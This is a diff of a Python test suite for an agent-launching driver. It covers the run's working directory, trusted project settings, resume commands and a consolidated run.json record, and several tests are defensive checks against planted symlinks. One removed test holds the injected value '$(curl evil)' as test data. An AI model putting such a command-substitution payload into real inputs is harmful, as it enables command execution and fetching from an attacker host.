@@ -34,7 +34,7 @@ class Recorder(clients.Client):
 
     def launch(self, prompt, run, *, params, access):
         Recorder.seen.append(dict(prompt=prompt, run=run, params=params, access=access))
-        return clients.Launch(["fake", params.sid], {"FAKE": "1"}, cwd=os.path.abspath(params.workdir))
+        return clients.Launch(["fake", params.sid], {"FAKE": "1"}, cwd=access.cwd)
 
 
 def claude(**overrides):
@@ -57,9 +57,10 @@ class Base(unittest.TestCase):
         return compose.RunParams(**{"input": "Research X.", "out": os.path.join(self.work, "out.md"),
                                     "workdir": self.work, "sid": SID, **kw})
 
-    def plan(self, role="researcher", task="light-research", client="fake", repo=None, layers=(), **params):
-        return drive.plan(CORE, clients.get(client, CORE), role, task, params=self.params(**params), repo=repo,
-                          layers=layers)[0]
+    def plan(self, role="researcher", task="light-research", client="fake", repo=None, layers=(), cwd=None, root=CORE,
+             **params):
+        return drive.plan(root, clients.get(client, root), role, task, params=self.params(**params), repo=repo,
+                          layers=layers, cwd=cwd or self.work)[0]
 
     def report(self):
         return f"python3 {CORE}/src/report.py --to {self.work}/.report.jsonl"
@@ -98,7 +99,7 @@ class Claude(Base):
         self.assertTrue(launch.argv[2].startswith("# Guide"))
         self.assertEqual(launch.argv[3:], [
             "--session-id", SID, "--model", "opus", "--effort", "high",
-            "--permission-mode", "auto", "--setting-sources", "user", "--strict-mcp-config",
+            "--permission-mode", "auto", "--strict-mcp-config", "--setting-sources", "user",
             "--output-format", "stream-json", "--verbose",
             "--allowedTools", f"Bash(python3 {CORE}/src/repo.py worktree --dir {self.work}/src *)",
             f"Bash({self.report()} *)"])
@@ -191,6 +192,12 @@ class Claude(Base):
             claude(tiers={}).launch("p", run(), params=PARAMS, access=NO_ACCESS)
         self.assertIn("no model for tier 2", str(cm.exception))
 
+    def test_setting_sources_in_flags_is_refused(self):
+        for flag in ("--setting-sources", "--setting-sources=user,project"):
+            with self.subTest(flag), self.assertRaises(compose.ConfigError) as cm:
+                claude(flags=["--verbose", flag, "user"])
+            self.assertIn("--setting-sources is the driver's", str(cm.exception))
+
     def test_role_value_applies_to_its_tasks_and_task_value_wins(self):
         c = claude(allow=["Read"], roles={"r": {"allow": ["WebFetch"], "tasks": {"u": {"allow": ["Grep"]}}}})
         self.assertEqual(c.value(run(), "allow"), ["WebFetch"])
@@ -204,6 +211,16 @@ class Claude(Base):
             argv = self.plan(client="claude").argv
         self.assertEqual(argv[argv.index("--model") + 1], "sonnet")
 
+    def test_transcript_and_resume_command_follow_the_cwd(self):
+        self.assertEqual(clients.claude.transcript("/a/b.c d", SID, "/p"), f"/p/-a-b-c-d/{SID}.jsonl")
+        launch = self.plan(client="claude")
+        self.assertEqual((launch.resume, launch.transcript),
+                         (f"cd {self.work} && claude --resume {SID}", clients.claude.transcript(self.work, SID)))
+        with redirect_stderr(io.StringIO()):
+            launch = self.plan(client="claude", cwd=self.repo)
+        self.assertEqual(launch.resume, f"cd {self.repo} && claude --resume {SID} --add-dir {self.work}")
+        self.assertEqual(launch.transcript, clients.claude.transcript(self.repo, SID))
+
     def test_unknown_config_key(self):
         with self.assertRaises(compose.ConfigError) as cm:
             claude(argv=[])
@@ -215,15 +232,16 @@ class Generic(Base):
         launch = self.plan(repo=self.repo)
         seen, = Recorder.seen
         self.assertEqual(seen["access"], drive.Access(dirs=[], commands=[
-            f"python3 {CORE}/src/repo.py worktree --dir {self.work}/src *", f"{self.report()} *"]))
+            f"python3 {CORE}/src/repo.py worktree --dir {self.work}/src *", f"{self.report()} *"], cwd=self.work))
         self.assertEqual((seen["params"].sid, seen["params"].resume, seen["run"].task), (SID, False, "light-research"))
         self.assertTrue(seen["prompt"].startswith("# Guide"))
         self.assertEqual((launch.argv, launch.env, launch.cwd), (["fake", SID], {"FAKE": "1"}, self.work))
 
     def test_layers_apply_after_the_clients_config(self):
         client = Recorder({"tier": 3, "effort": "low"})
-        drive.plan(CORE, client, "researcher", "light-research", params=self.params())
-        drive.plan(CORE, client, "researcher", "light-research", params=self.params(), layers=[{"tier": 4}, {"tier": 1}])
+        drive.plan(CORE, client, "researcher", "light-research", params=self.params(), cwd=self.work)
+        drive.plan(CORE, client, "researcher", "light-research", params=self.params(), layers=[{"tier": 4}, {"tier": 1}],
+                   cwd=self.work)
         plain, layered = (s["run"] for s in Recorder.seen)
         self.assertEqual((plain.tier, plain.effort), (3, "low"))
         self.assertEqual((layered.tier, layered.effort), (1, "low"))
@@ -241,7 +259,7 @@ class Generic(Base):
         acc = drive.access(run(write=["repo"], commands=["{{scripts}}/x --dir {{workdir}}/src *"]), self.params(),
                            repo=self.repo, scripts="/s", methods="/m")
         self.assertEqual(acc, drive.Access(dirs=[self.repo], commands=[
-            f"/s/x --dir {self.work}/src *", f"python3 /s/report.py --to {self.work}/.report.jsonl *"]))
+            f"/s/x --dir {self.work}/src *", f"python3 /s/report.py --to {self.work}/.report.jsonl *"], cwd=self.work))
 
     def test_methods_fills_read_and_write_entries_and_nothing_else_does(self):
         acc = drive.access(run(read=["{{methods}}"], write=["{{methods}}/out"]), self.params(), repo=None, scripts="/s",
@@ -270,6 +288,148 @@ class Generic(Base):
             self.plan(client="skill")
         with self.assertRaises(compose.ConfigError):
             drive.export(CORE, claude(), "dummy-tester", dest=self.tmp.name)
+
+
+class Cwd(Base):
+    """drive.place: the run's cwd and whether its project settings load."""
+    def setUp(self):
+        super().setUp()
+        self.trusted = os.path.realpath(os.path.join(self.tmp.name, "trusted"))
+        self.other = os.path.realpath(os.path.join(self.tmp.name, "other"))
+        for d in (self.trusted, self.other):
+            os.makedirs(d)
+            with open(os.path.join(d, ".mcp.json"), "w") as f:
+                f.write("{}")
+
+    def core(self, *trusted):
+        """A core root whose config.toml lists `trusted` as trusted_dirs."""
+        root = os.path.join(self.tmp.name, "core")
+        os.makedirs(root, exist_ok=True)
+        for d in ("team", "output"):
+            if not os.path.lexists(os.path.join(root, d)):
+                os.symlink(os.path.join(CORE, d), os.path.join(root, d))
+        with open(os.path.join(CORE, compose.CONFIG)) as f:
+            cfg = f.read()
+        with open(os.path.join(root, compose.CONFIG), "w") as f:
+            f.write(cfg.replace('\n# trusted_dirs = ["~/data-repo"]\n', f"\ntrusted_dirs = {json.dumps(list(trusted))}\n"))
+        return root
+
+    def launch(self, *trusted, cwd=None, layers=(), **params):
+        """(Launch, stderr) of light-research for claude, trusted_dirs `trusted`."""
+        err = io.StringIO()
+        with redirect_stderr(err):
+            launch = self.plan(client="claude", root=self.core(*trusted), cwd=cwd, layers=layers, **params)
+        return launch, err.getvalue()
+
+    @staticmethod
+    def flag(argv, name):
+        return [argv[i + 1] for i, a in enumerate(argv) if a == name]
+
+    def test_unset_is_the_callers_current_directory(self):
+        err = io.StringIO()
+        with redirect_stderr(err):
+            launch, _ = drive.plan(CORE, claude(), "researcher", "light-research", params=self.params())
+        self.assertEqual((launch.cwd, launch.project), (os.getcwd(), False))
+        self.assertEqual(self.flag(launch.argv, "--add-dir"), [self.work])
+        self.assertEqual(err.getvalue(), f"drive.py: cwd {os.getcwd()} is not in trusted_dirs: its project settings are off\n")
+
+    def test_the_run_key_wins_over_the_default_and_expands_tilde(self):
+        with unittest.mock.patch.dict(os.environ, {"HOME": self.tmp.name}):
+            launch, _ = self.launch(cwd=self.trusted, layers=[{"roles": {"researcher": {"cwd": "~/other"}}}])
+        self.assertEqual(launch.cwd, os.path.join(self.tmp.name, "other"))
+
+    def test_a_trusted_cwd_loads_project_settings_and_its_mcp_config(self):
+        link = os.path.join(self.tmp.name, "link")
+        os.symlink(self.trusted, link)
+        for entry, cwd in ((self.trusted, self.trusted), (link, self.trusted), (self.tmp.name, self.trusted)):
+            with self.subTest(entry=entry):
+                launch, err = self.launch(entry, cwd=cwd)
+                for argv in (launch.argv, launch.interactive):
+                    self.assertEqual(self.flag(argv, "--setting-sources"), ["user,project,local"])
+                    self.assertEqual(self.flag(argv, "--mcp-config"), [os.path.join(cwd, ".mcp.json")])
+                    self.assertEqual(self.flag(argv, "--add-dir"), [self.work])
+                    self.assertIn("--strict-mcp-config", argv)
+                self.assertEqual((launch.cwd, launch.project, err), (cwd, True, ""))
+
+    def test_a_trusted_cwd_without_mcp_json_gets_no_mcp_config(self):
+        os.remove(os.path.join(self.trusted, ".mcp.json"))
+        launch, _ = self.launch(self.trusted, cwd=self.trusted)
+        self.assertEqual(self.flag(launch.argv, "--mcp-config"), [])
+
+    def test_an_untrusted_cwd_gets_user_settings_and_a_notice(self):
+        launch, err = self.launch(self.trusted, cwd=self.other)
+        self.assertEqual((self.flag(launch.argv, "--setting-sources"), self.flag(launch.argv, "--mcp-config")), (["user"], []))
+        self.assertEqual((launch.cwd, launch.project, self.flag(launch.argv, "--add-dir")), (self.other, False, [self.work]))
+        self.assertEqual(err, f"drive.py: cwd {self.other} is not in trusted_dirs: its project settings are off\n")
+
+    def test_the_workdir_as_cwd_has_no_notice_and_no_add_dir(self):
+        launch, err = self.launch()
+        self.assertEqual((launch.cwd, err, self.flag(launch.argv, "--add-dir")), (self.work, "", []))
+        self.assertEqual(self.flag(launch.argv, "--setting-sources"), ["user"])
+
+    def test_a_trusted_cwd_in_the_workdir_is_refused(self):
+        sub = os.path.join(self.work, "sub")
+        os.makedirs(sub)
+        for cwd in (self.work, sub):
+            with self.subTest(cwd=cwd), self.assertRaises(compose.ConfigError) as cm:
+                self.launch(self.tmp.name, cwd=cwd)
+            self.assertIn(f"cwd {cwd} is in trusted_dirs and in the workdir", str(cm.exception))
+        launch, _ = self.launch(cwd=sub)
+        self.assertEqual((launch.cwd, launch.project), (sub, False))
+
+    def test_a_cwd_that_is_no_directory_or_no_path_is_a_config_error(self):
+        for cwd, want in ((os.path.join(self.tmp.name, "nope"), "is not a directory"), ("rel/dir", "absolute or ~ path")):
+            with self.subTest(cwd=cwd), self.assertRaises(compose.ConfigError) as cm:
+                self.launch(cwd=self.other, layers=[{"cwd": cwd}])
+            self.assertIn(want, str(cm.exception))
+
+    def test_a_bad_trusted_dirs_is_a_config_error(self):
+        with self.assertRaises(compose.ConfigError) as cm:
+            self.launch("rel/dir")
+        self.assertIn("trusted_dirs", str(cm.exception))
+
+    def write_record(self, *entries):
+        os.makedirs(self.work, exist_ok=True)
+        with open(os.path.join(self.work, "run.json"), "w") as f:
+            json.dump({"sessions": list(entries), "progress": [], "outcome": None}, f)
+
+    def test_a_resume_reuses_the_recorded_cwd_and_project(self):
+        self.write_record({"sid": SID, "cwd": self.trusted, "project": True})
+        launch, err = self.launch(self.trusted, cwd=self.other, layers=[{"cwd": self.work}], resume=True)
+        self.assertEqual((launch.cwd, launch.project, err), (self.trusted, True, ""))
+        self.assertEqual(self.flag(launch.argv, "--resume"), [SID])
+        self.write_record({"sid": SID, "cwd": self.trusted, "project": False})
+        launch, _ = self.launch(self.trusted, resume=True)
+        self.assertEqual((launch.cwd, self.flag(launch.argv, "--setting-sources")), (self.trusted, ["user"]))
+
+    def test_a_resume_whose_cwd_is_no_longer_trusted_is_refused(self):
+        self.write_record({"sid": SID, "cwd": self.trusted, "project": True})
+        with self.assertRaises(compose.ConfigError) as cm:
+            self.launch(resume=True)
+        self.assertIn(f"cwd {self.trusted} is no longer in trusted_dirs", str(cm.exception))
+
+    def test_a_resume_without_its_session_in_the_record_runs_in_the_workdir(self):
+        for entries in ((), ({"sid": "other", "cwd": self.trusted, "project": True},),
+                        ({"sid": SID, "cwd": "rel", "project": True},), ({"sid": SID, "cwd": self.trusted, "project": 1},)):
+            with self.subTest(entries=entries):
+                self.write_record(*entries)
+                launch, err = self.launch(self.trusted, cwd=self.trusted, resume=True)
+                self.assertEqual((launch.cwd, launch.project, err), (self.work, False, ""))
+
+    def test_prompt_paths_stay_absolute_whatever_the_cwd(self):
+        os.makedirs(self.work)
+        with open(os.path.join(self.work, "input.md"), "w") as f:
+            f.write("Research X.")
+        here = os.getcwd()
+        os.chdir(self.tmp.name)
+        self.addCleanup(os.chdir, here)
+        for cwd in (self.trusted, self.other):
+            with self.subTest(cwd=cwd):
+                launch, _ = self.launch(self.trusted, cwd=cwd, input="work/input.md", workdir="work")
+                tail = launch.argv[2].rsplit("\n---\n", 1)[1]
+                work = os.path.join(os.getcwd(), "work")
+                self.assertEqual(tail, f"\nInput: {work}/input.md\nWorkdir: {work}\n")
+                self.assertIn(f"--to {work}/.report.jsonl", launch.argv[2])
 
 
 def methods_copy(skill):
@@ -733,12 +893,15 @@ class Start(Base):
             return self.proc
 
         r = drive.start(launch, run(output=output or {"type": "local"}, progress=list(progress)), p, client=claude(), popen=popen,
-                        sinks=sinks if sinks is not None else [drive.terminal(log), *drive.default_sinks(p)[1:]])
+                        sinks=sinks if sinks is not None else [drive.terminal(log)])
         return r, calls, log.getvalue()
 
     def read(self, name):
         with open(os.path.join(self.work, name)) as f:
             return f.read()
+
+    def record(self):
+        return json.loads(self.read("run.json"))
 
     def exists(self, name):
         return os.path.lexists(os.path.join(self.work, name))
@@ -749,8 +912,8 @@ class Start(Base):
         self.assertEqual((r.returncode, r.outcome.status, r.outcome.url), (0, "done", out))
         self.assertEqual((argv, kw["cwd"], kw["env"]["FAKE"]), (["fake"], self.work, "1"))
         self.assertEqual(self.read("out.md"), "# Doc\n")
-        self.assertEqual(json.loads(self.read("outcome.json"))["url"], out)
-        self.assertEqual(json.loads(self.read("progress.jsonl")) | {"ts": ""}, {"ts": "", "name": "round", "text": "half way"})
+        self.assertEqual(self.record()["outcome"]["url"], out)
+        self.assertEqual([p | {"ts": ""} for p in self.record()["progress"]], [{"ts": "", "name": "round", "text": "half way"}])
         self.assertEqual(log, "Progress (round): half way\nhi\n")
 
     def test_run_env_drops_claude_code_child_session(self):
@@ -867,23 +1030,21 @@ class Start(Base):
         self.assertEqual(r.outcome.url, url)
         self.assertFalse(self.exists("out.md"))
 
-    def test_needs_input_reaches_the_outcome_file(self):
+    def test_needs_input_reaches_the_record(self):
         self.start([outcome({**DONE, "status": "needs_input", "questions": ["Which repo?"], "deliverable": ""})])
-        self.assertEqual(json.loads(self.read("outcome.json"))["questions"], ["Which repo?"])
+        self.assertEqual(self.record()["outcome"]["questions"], ["Which repo?"])
 
     def test_no_outcome(self):
         r, _, _ = self.start([said("bye")])
         self.assertEqual((r.returncode, r.outcome, r.error), (0, None, "the agent run returned no outcome"))
 
-    def test_failed_client_ignores_the_outcome_and_leaves_no_stale_files(self):
-        os.makedirs(self.work)
-        for name in ("outcome.json", "out.md"):
-            with open(os.path.join(self.work, name), "w") as f:
-                f.write("old")
+    def test_failed_client_ignores_the_outcome_and_leaves_no_stale_outcome(self):
+        self.start([outcome(DONE)])
         seen = []
-        r, _, _ = self.start([outcome(DONE)], rc=143, sinks=[seen.append, *drive.default_sinks(self.params())[1:]])
+        r, _, _ = self.start([outcome(DONE)], rc=143, sinks=[seen.append])
         self.assertEqual((r.returncode, r.outcome, seen), (143, None, []))
-        self.assertFalse(self.exists("outcome.json") or self.exists("out.md"))
+        self.assertFalse(self.exists("out.md"))
+        self.assertIsNone(self.record()["outcome"])
 
     def test_invalid_outcome_is_the_error_and_reaches_no_sink(self):
         seen = []
@@ -897,31 +1058,17 @@ class Start(Base):
             f.write("mine")
 
         def items():
-            for name in ("outcome.json", "out.md"):
+            os.remove(os.path.join(self.work, "run.json"))
+            for name in ("run.json", "out.md"):
                 os.symlink(target, os.path.join(self.work, name))
-            yield from feed(os.path.join(self.work, ".report.jsonl"), [outcome(DONE)])
+            yield from feed(os.path.join(self.work, ".report.jsonl"), [progress("round", "x"), outcome(DONE)])
 
         self.start(items())
         with open(target) as f:
             self.assertEqual(f.read(), "mine")
-        self.assertFalse(os.path.islink(os.path.join(self.work, "outcome.json")))
+        self.assertFalse(os.path.islink(os.path.join(self.work, "run.json")))
+        self.assertEqual(self.record()["outcome"]["status"], "done")
         self.assertEqual(self.read("out.md"), "# Doc\n")
-
-    def test_progress_refuses_a_planted_symlink_and_stops_the_run(self):
-        target = os.path.join(self.tmp.name, "zshrc")
-        with open(target, "w") as f:
-            f.write("mine")
-
-        def items():
-            os.remove(os.path.join(self.work, "progress.jsonl"))
-            os.symlink(target, os.path.join(self.work, "progress.jsonl"))
-            yield from feed(os.path.join(self.work, ".report.jsonl"), [progress("round", "$(curl evil)"), said("x")])
-
-        with self.assertRaises(OSError):
-            self.start(items())
-        self.assertTrue(self.proc.killed)
-        with open(target) as f:
-            self.assertEqual(f.read(), "mine")
 
     def test_an_error_reading_stdout_stops_the_run(self):
         def items():
@@ -938,7 +1085,6 @@ class Start(Base):
         self.assertEqual([(e.kind, e.name, e.text) for e in seen[:2]], [("progress", "round", "one"), ("text", "", "hi")])
         self.assertEqual((seen[2].kind, seen[2].outcome["url"]), ("outcome", os.path.join(self.work, "out.md")))
         self.assertEqual(log, "")
-        self.assertFalse(self.exists("progress.jsonl") or self.exists("outcome.json"))
         self.assertEqual(self.read("out.md"), "# Doc\n")
 
     def test_every_sink_gets_every_event(self):
@@ -950,10 +1096,77 @@ class Start(Base):
     def test_resume_appends_progress_a_new_run_resets_it(self):
         self.start([progress("round", "one"), outcome(DONE)])
         self.start([progress("round", "二"), outcome(DONE)], resume=True)
-        self.assertEqual([json.loads(l)["text"] for l in self.read("progress.jsonl").splitlines()], ["one", "二"])
-        self.assertIn("二", self.read("progress.jsonl"))
+        self.assertEqual([p["text"] for p in self.record()["progress"]], ["one", "二"])
+        self.assertIn("二", self.read("run.json"))
         self.start([progress("round", "three"), outcome(DONE)])
-        self.assertEqual([json.loads(l)["text"] for l in self.read("progress.jsonl").splitlines()], ["three"])
+        self.assertEqual([p["text"] for p in self.record()["progress"]], ["three"])
+
+    def recorded(self, launch, items=(), **params):
+        """drive.start of `launch` over `items`; (result, the record `begun` saw, the record after)."""
+        p, seen = self.params(**params), []
+
+        def begun():
+            seen.append(drive.record(self.work))
+        r = drive.start(launch, run(), p, client=claude(), sinks=[], begun=begun,
+                        popen=lambda argv, **kw: FakeProc(feed(p.channel, items)))
+        return r, seen[0], self.record()
+
+    def test_the_record_holds_the_session_its_progress_and_outcome(self):
+        launch = drive.Launch(["fake"], cwd=self.repo, transcript="/p/x.jsonl", resume="cd x && resume", project=True)
+        r, before, after = self.recorded(launch, [progress("round", "one"), outcome(DONE)])
+        entry = {"sid": SID, "cwd": self.repo, "project": True, "transcript": "/p/x.jsonl", "resume": "cd x && resume"}
+        (b,), (a,) = before["sessions"], after["sessions"]
+        self.assertEqual((b | {"started": ""}, before["progress"], before["outcome"]),
+                         (entry | {"started": "", "ended": None}, [], None))
+        self.assertEqual((a["started"], a["ended"] is not None), (b["started"], True))
+        self.assertEqual([(x["name"], x["text"]) for x in after["progress"]], [("round", "one")])
+        self.assertEqual(after["outcome"], dataclasses.asdict(r.outcome))
+        self.assertEqual(drive.session(self.work, SID), a)
+
+    def test_a_new_session_adds_an_entry_and_restarts_progress_a_resume_keeps_both(self):
+        other = "99999999-2222-3333-4444-555555555555"
+        self.recorded(drive.Launch(["fake"], cwd=self.work), [progress("a", "1")])
+        self.recorded(drive.Launch(["fake"], cwd=self.work), [progress("b", "2")], sid=other)
+        _, _, rec = self.recorded(drive.Launch(["fake"], cwd=self.repo), [progress("c", "3")], sid=other, resume=True)
+        self.assertEqual([e["sid"] for e in rec["sessions"]], [SID, other])
+        self.assertEqual([x["name"] for x in rec["progress"]], ["b", "c"])
+        self.assertEqual(rec["sessions"][1]["cwd"], self.repo)
+
+    def test_a_resume_keeps_its_sessions_start_time(self):
+        self.recorded(drive.Launch(["fake"], cwd=self.work))
+        started = self.record()["sessions"][0]["started"]
+        with unittest.mock.patch.object(drive, "stamp", lambda: "later"):
+            _, _, rec = self.recorded(drive.Launch(["fake"], cwd=self.work), resume=True)
+        self.assertEqual((rec["sessions"][0]["started"], rec["sessions"][0]["ended"]), (started, "later"))
+
+    def test_an_unreadable_record_is_started_anew(self):
+        os.makedirs(self.work)
+        for text in ("not json", "[]", '{"sessions": 1, "progress": 2}', '{"sessions": [1, {"sid": "x"}]}'):
+            with self.subTest(text=text):
+                with open(os.path.join(self.work, "run.json"), "w") as f:
+                    f.write(text)
+                _, _, rec = self.recorded(drive.Launch(["fake"], cwd=self.work), resume=True)
+                self.assertEqual([e["sid"] for e in rec["sessions"] if isinstance(e, dict) and "cwd" in e], [SID])
+
+    def test_a_symlink_or_fifo_record_is_not_read(self):
+        os.makedirs(self.work)
+        target = os.path.join(self.tmp.name, "planted.json")
+        with open(target, "w") as f:
+            json.dump({"sessions": [{"sid": SID, "cwd": "/", "project": True}]}, f)
+        path = os.path.join(self.work, "run.json")
+        os.symlink(target, path)
+        self.assertEqual((drive.record(self.work), drive.session(self.work, SID)), ({}, None))
+        os.remove(path)
+        os.mkfifo(path)
+        self.assertEqual(drive.record(self.work), {})
+
+    def test_the_end_time_is_recorded_when_the_run_raises(self):
+        def items():
+            yield said("x")
+            raise KeyboardInterrupt
+        with self.assertRaises(KeyboardInterrupt):
+            self.start(items(), sinks=[])
+        self.assertIsNotNone(self.record()["sessions"][0]["ended"])
 
     FAILED = {**DONE, "status": "failed", "deliverable": ""}
     NEEDS = {**DONE, "status": "needs_input", "questions": ["Which repo?"], "deliverable": ""}
@@ -1401,13 +1614,15 @@ class Main(Base):
         return code, out.getvalue(), err.getvalue(), calls
 
     def test_dry_run_prints_plan_and_runs_nothing(self):
-        code, out, _, calls = self.run_main("--dry-run")
+        code, out, err, calls = self.run_main("--dry-run")
         data = json.loads(out)
         self.assertEqual((code, calls), (0, []))
-        self.assertEqual((data["argv"][0], data["cwd"]), ("claude", self.work))
+        self.assertEqual((data["argv"][0], data["cwd"]), ("claude", os.getcwd()))
+        self.assertIn(f"drive.py: cwd {os.getcwd()} is not in trusted_dirs: its project settings are off\n", err)
+        self.assertFalse(os.path.exists(self.work))
 
     def test_dry_run_prints_the_runners_command(self):
-        launch = self.plan("dummy-tester", "echo", client="claude", input="Hello.")
+        launch = self.plan("dummy-tester", "echo", client="claude", input="Hello.", cwd=os.getcwd())
         code, out, _, _ = self.run_main("--dry-run", "--sid", SID, "--runner", "tui")
         self.assertEqual((code, json.loads(out)["argv"]), (0, launch.interactive))
 
@@ -1423,8 +1638,15 @@ class Main(Base):
         self.assertIn(f"session {SID}", err)
         self.assertIn("status done", err)
         (argv, kw), = calls
-        self.assertEqual((argv[0], kw["cwd"]), ("claude", self.work))
+        self.assertEqual((argv[0], kw["cwd"]), ("claude", os.getcwd()))
         self.assertEqual(kw["env"]["PATH"], os.environ["PATH"])
+
+    def test_a_run_by_hand_leaves_its_record(self):
+        code, _, _, _ = self.run_main("--sid", SID, lines=[outcome(DONE)])
+        entry = drive.session(self.work, SID)
+        self.assertEqual((code, entry["cwd"], entry["project"]), (0, os.getcwd(), False))
+        self.assertEqual(entry["resume"], f"cd {os.getcwd()} && claude --resume {SID} --add-dir {self.work}")
+        self.assertEqual(entry["transcript"], clients.claude.transcript(os.getcwd(), SID))
 
     def test_no_outcome_exits_1(self):
         code, _, err, _ = self.run_main()
